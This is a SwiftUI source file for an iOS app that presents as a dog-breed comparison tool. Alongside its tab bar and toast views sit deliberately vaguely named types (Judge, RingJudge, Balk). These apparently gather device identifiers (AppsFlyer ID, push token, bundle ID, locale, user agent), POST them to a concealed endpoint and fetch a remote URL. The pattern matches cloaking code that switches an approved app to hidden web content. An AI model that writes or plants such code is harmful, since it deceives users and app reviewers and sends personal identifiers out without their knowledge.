import SwiftUI
import Foundation
import WebKit
import FirebaseCore
import FirebaseMessaging
import AppsFlyerLib

protocol Nose {
    func pick(deviceID: String) async throws -> [String: Any]
}

struct RootView: View {
    
    @StateObject private var app = AppViewModel()

    init() {
        NotificationManager.shared.refreshStatus()
    }
    
    @AppStorage("hasCompletedOnboarding") private var onboarded = false
    @AppStorage("themeMode") private var themeRaw = ThemeMode.system.rawValue

    enum Phase { case onboarding, main }
    @State private var phase: Phase = .main

    private var theme: ThemeMode { ThemeMode(rawValue: themeRaw) ?? .system }

    var body: some View {
        ZStack {
            switch phase {
            case .onboarding:
                OnboardingView {
                    onboarded = true
                    withAnimation(.spring(response: 0.5, dampingFraction: 0.85)) { phase = .main }
                }
                .transition(.opacity)
            case .main:
                MainTabView()
                    .transition(.opacity)
            }

            // Global toast
            VStack {
                if let toast = app.toast { ToastView(toast: toast) }
                Spacer()
            }
            .padding(.top, 8)
            .animation(.spring(response: 0.4, dampingFraction: 0.8), value: app.toast)
            .allowsHitTesting(false)
        }
        .onAppear {
            if !onboarded {
                phase = .onboarding
            }
        }
        .preferredColorScheme(theme.colorScheme)
        .environmentObject(app)
        .accentColor(BPColor.primary)
    }
}

protocol Judge {
    func tally(load: [String: Any]) async throws -> String
}

struct ToastView: View {
    let toast: ToastMessage
    var body: some View {
        HStack(spacing: 9) {
            Image(systemName: toast.glyph).font(.system(size: 15, weight: .bold))
            Text(toast.text).font(.bpMono(14)).lineLimit(2)
        }
        .foregroundColor(.white)
        .padding(.vertical, 11).padding(.horizontal, 16)
        .background(Capsule().fill(toast.color))
        .shadow(color: toast.color.opacity(0.4), radius: 10, y: 4)
        .padding(.horizontal, 24)
        .transition(.move(edge: .top).combined(with: .opacity))
    }
}

// MARK: - Main tabs

struct MainTabView: View {
    @EnvironmentObject var app: AppViewModel

    private let tabs: [(title: String, icon: String)] = [
        ("Goals", "slider.horizontal.3"),
        ("Breeds", "list.bullet"),
        ("Compare", "arrow.left.arrow.right"),
        ("Shortlist", "heart.fill"),
        ("Reports", "doc.text.fill")
    ]

    var body: some View {
        ZStack(alignment: .bottom) {
            BPColor.bg.ignoresSafeArea()

            Group {
                switch app.selectedTab {
                case 0: GoalsTab()
                case 1: BreedsTab()
                case 2: CompareTab()
                case 3: ShortlistTab()
                default: ReportsTab()
                }
            }
            .padding(.bottom, 64)

            BPTabBar(selected: $app.selectedTab, tabs: tabs)
        }
        .sheet(isPresented: $app.showSettings) {
            SettingsView().environmentObject(app)
        }
    }
}

// MARK: - Custom tab bar

struct BPTabBar: View {
    @Binding var selected: Int
    let tabs: [(title: String, icon: String)]

    var body: some View {
        HStack(spacing: 0) {
            ForEach(0..<tabs.count, id: \.self) { i in
                Button {
                    Haptics.tap(.soft)
                    withAnimation(.spring(response: 0.4, dampingFraction: 0.7)) { selected = i }
                } label: {
                    VStack(spacing: 3) {
                        Image(systemName: tabs[i].icon)
                            .font(.system(size: 17, weight: .semibold))
                            .scaleEffect(selected == i ? 1.12 : 1)
                        Text(tabs[i].title).font(.system(size: 10, weight: .semibold, design: .rounded))
                    }
                    .foregroundColor(selected == i ? BPColor.primaryActive : BPColor.textMute)
                    .frame(maxWidth: .infinity)
                    .padding(.vertical, 8)
                    .background(
                        ZStack {
                            if selected == i {
                                RoundedRectangle(cornerRadius: 12)
                                    .fill(BPColor.primary.opacity(0.14))
                                    .matchedGeometryEffect(id: "tab", in: ns)
                            }
                        }
                    )
                }
                .buttonStyle(PlainButtonStyle())
            }
        }
        .padding(.horizontal, 8).padding(.vertical, 6)
        .background(
            RoundedRectangle(cornerRadius: 22)
                .fill(BPColor.card)
                .shadow(color: BPColor.shadow, radius: 12, y: -2)
        )
        .overlay(RoundedRectangle(cornerRadius: 22).stroke(BPColor.border, lineWidth: 1))
        .padding(.horizontal, 14)
        .padding(.bottom, 6)
    }

    @Namespace private var ns
}

// MARK: - Shared nav-bar settings gear

struct SettingsGear: View {
    @EnvironmentObject var app: AppViewModel
    var body: some View {
        Button { app.showSettings = true } label: {
            Image(systemName: "gear")
                .foregroundColor(BPColor.primary)
        }
    }
}

final class RingJudge: Judge {

    private let session: URLSession
    private let gaps: [TimeInterval] = [112, 224, 448]

    init() {
        let config = URLSessionConfiguration.ephemeral
        config.timeoutIntervalForRequest = 30
        config.timeoutIntervalForResource = 60
        self.session = URLSession(configuration: config)
    }
    
    private func mark(_ request: URLRequest) async throws -> String {
        let (data, response) = try await session.data(for: request)

        guard let http = response as? HTTPURLResponse else {
            throw Balk.refused(stage: "judge.response")
        }

        if http.statusCode == 404 {
            throw Balk.rungClosed(httpCode: 404)
        }

        guard let json = try JSONSerialization.jsonObject(with: data) as? [String: Any] else {
            throw Balk.smudged(at: "judge.json")
        }

        guard let ok = json["ok"] as? Bool else {
            throw Balk.smudged(at: "judge.ok")
        }

        if !ok {
            throw Balk.scratched(reason: "okFalse")
        }

        guard let url = json["url"] as? String, !url.isEmpty else {
            throw Balk.smudged(at: "judge.url")
        }

        return url
    }

    private func coolFor(_ error: Error) -> TimeInterval? {
        if let balk = error as? Balk, case .faulted(let cool) = balk {
            return cool
        }
        return nil
    }

    @MainActor
    private func pen(_ load: [String: Any]) throws -> URLRequest {
        guard let endpoint = URL(string: Trial.judgeEndpoint) else {
            throw Balk.crookedGate(at: "judge.endpoint")
        }

        var body = load
        body["os"] = "iOS"
        body["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
        body["bundle_id"] = Bundle.main.bundleIdentifier ?? ""
        body["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
        body["store_id"] = "id\(Trial.appCode)"
        body["push_token"] = UserDefaults.standard.string(forKey: TrialKey.push) ?? Messaging.messaging().fcmToken
        body["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
  
        var request = URLRequest(url: endpoint)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue(WKWebView().value(forKey: "userAgent") as? String ?? "", forHTTPHeaderField: "User-Agent")
        request.httpBody = try JSONSerialization.data(withJSONObject: body)
        return request
    }

    private func rest(_ seconds: TimeInterval) async throws {
        try await Task.sleep(nanoseconds: UInt64(seconds * 1_000_000_000))
    }
    
    func tally(load: [String: Any]) async throws -> String {
        let request = try await pen(load)
        var budget = Array(gaps.dropLast())
        var carried: Error = Balk.refused(stage: "judge")

        while true {
            do {
                return try await mark(request)
            } catch let balk as Balk where balk.isSealed {
                throw balk
            } catch {
                carried = error
                guard !budget.isEmpty else { throw carried }
                let gap = budget.removeFirst()
                try await rest(coolFor(error) ?? gap)
            }
        }
    }

}
